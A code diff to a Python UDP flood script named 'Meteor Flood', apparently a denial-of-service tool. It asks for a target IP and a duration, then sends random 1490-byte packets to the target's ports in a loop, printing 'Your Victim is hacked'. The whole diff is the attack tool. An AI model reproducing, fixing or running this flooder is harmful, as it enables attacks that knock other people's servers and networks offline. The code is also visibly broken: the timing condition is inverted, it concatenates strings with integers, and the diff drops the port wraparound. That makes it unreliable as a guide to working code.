@@ -11,13 +11,13 @@ def clr():
         os.system('clear')
 
 def banner():
-    """"
-    Banner Coming soon
-    till then injoy 
-    without it 
-    hope its okay
-    """
-
+    logo = """"
+            Banner Coming soon
+            till then injoy
+            without it
+            hope its okay
+            """
+    print(logo)
 
 def exeet():
     print("\nThanks For Using Meteor Flood..")
@@ -29,9 +29,9 @@ clr()
 banner()
 port = 1
 ip = input("\nEnter IP: ")
-dur = int(input("\tenter Duration:"))
-bytes = os.urandom(1024)
-socket = socket.socket(socket.AFINET, socket.SOCKDGRAM)
+dur = int(input("\tEnter Duration:"))
+bytes = random._urandom(1490)
+socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sent = int(0)
 timeout = time.time()+dur
 print
@@ -41,12 +41,17 @@ while True and time.time()>timeout:
     try:
         socket.sendto(bytes,(ip, port))
         sent = sent+1
-        if port == 65535:
-            port = 1
-        else:
-            port = port+1
-            print(sent, ip, port)
+        port = port+1
+        print("Sent " + sent + " packet to " + ip + " throught port: " + port)
+        print("Your Victim is hacked\n\tGrand Salute To Creator")
     except KeyboardInterrupt:
         exeet()
         sys.exit()
+
+
+
+
+
+
+
 
